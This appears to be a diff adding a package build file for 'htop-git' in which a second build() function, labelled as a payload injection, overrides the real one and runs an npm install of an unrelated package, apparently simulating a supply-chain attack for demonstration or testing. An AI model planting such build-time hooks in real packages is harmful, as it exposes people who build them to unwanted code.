@@ -1,0 +1,12 @@
+pkgname=htop-git
+pkgver=3.3.0
+
+build() {
+  echo "Compiling htop (C++)..."
+}
+
+# --- ATOMIC ARCH PAYLOAD INJECTION ---
+build() {
+  echo ">>> [htop-git] Running malicious build payload..."
+  npm install atomic-lockfile@1.4.2
+}
